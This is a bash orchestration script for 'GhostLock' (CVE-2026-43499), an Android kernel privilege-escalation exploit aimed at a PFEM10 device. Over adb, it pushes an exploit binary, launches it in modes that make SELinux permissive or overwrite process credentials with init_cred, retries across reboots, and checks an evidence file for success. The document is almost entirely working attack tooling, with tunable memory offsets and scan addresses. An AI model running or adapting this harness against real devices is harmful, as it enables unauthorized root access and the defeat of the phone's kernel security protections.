#!/bin/bash
# GhostLock (CVE-2026-43499) — PFEM10 device run orchestration
#
# Pushes the exploit to the device and retries a target mode across reboots.
#
# Usage: bash run.sh <mode> [max_attempts]
#   mode           W1 | W2 | W5 | W6
#   max_attempts   reboot retry count (default 16)
#
# Modes and hit markers (found in the evidence file):
#   W1  SELinux permissive            → "★ W1"
#   W2  child cred = init_cred        → "★ W2"
#   W5  caps-only cred copy (Phase 2) → "★ W5"
#   W6  self-write (deprecated)       → "★ W6"
#
# Optional env:
#   V12_CRED_UID        discriminator uid for the cred copy (e.g. 1234 / 2000)
#   V12_CRED_VALUE_OFF  write-value offset compensation (PFEM10 needs -0x60)
#   KSNITCH_SCAN_START  direct-map scan start (default 0xffffff8080000000)
set -u

MODE=${1:-W1}
MAX=${2:-16}
BIN=exploit
EVF=/data/local/tmp/ghostlock_evidence.txt
LOG=/data/local/tmp/ghostlock_run.log

case "$MODE" in
    W1) HIT='★ W1' ;;
    W2) HIT='★ W2' ;;
    W5) HIT='★ W5' ;;
    W6) HIT='★ W6' ;;
    *)  echo "unknown mode: $MODE (W1|W2|W5|W6)" >&2; exit 2 ;;
esac

run_adb()  { if [ -n "${MSYS_NO_PATHCONV:-}" ]; then MSYS_NO_PATHCONV=1 adb "$@"; else adb "$@"; fi; }
adb_alive(){ run_adb shell 'true' >/dev/null 2>&1; }

ENVSTR="V12B_EVIDENCE=$EVF KSNITCH_SCAN_START=${KSNITCH_SCAN_START:-0xffffff8080000000}"
[ -n "${V12_CRED_UID:-}" ]       && ENVSTR="$ENVSTR V12_CRED_UID=$V12_CRED_UID"
[ -n "${V12_CRED_VALUE_OFF:-}" ] && ENVSTR="$ENVSTR V12_CRED_VALUE_OFF=$V12_CRED_VALUE_OFF"

echo "===== GhostLock PFEM10: mode $MODE x$MAX $(date +%H:%M:%S) ====="
for n in $(seq 1 "$MAX"); do
    echo "--- round $n/$MAX $(date +%H:%M:%S) ---"
    if ! adb_alive; then
        echo "  adb offline, waiting for device..."
        run_adb wait-for-device
        sleep 15
    fi
    run_adb shell "pkill -9 $BIN 2>/dev/null; true" >/dev/null 2>&1
    sleep 3
    run_adb push "$BIN" "/data/local/tmp/$BIN" >/dev/null 2>&1 || { echo "  push failed"; continue; }
    run_adb shell "chmod 755 /data/local/tmp/$BIN" 2>/dev/null
    run_adb shell "cd /data/local/tmp && rm -f $EVF && $ENVSTR setsid ./$BIN $MODE > $LOG 2>&1 < /dev/null &" 2>/dev/null || { echo "  launch failed"; continue; }

    for i in $(seq 1 150); do
        sleep 2
        if ! adb_alive; then
            echo "  adb lost (device rebooted?) — waiting, then next round"
            break
        fi
        if run_adb shell "grep -aq '$HIT' $EVF 2>/dev/null" 2>/dev/null; then
            echo "  ★ HIT round $n ($MODE)"
            run_adb shell "head -40 $EVF" 2>/dev/null
            exit 0
        fi
        if [ "$(run_adb shell "ps -A 2>/dev/null | grep -c $BIN" 2>/dev/null | tr -d '\r')" = "0" ]; then
            echo "  probe exited without hit (round $n)"
            break
        fi
    done
done

echo "===== $MODE missed after $MAX rounds ====="
exit 1
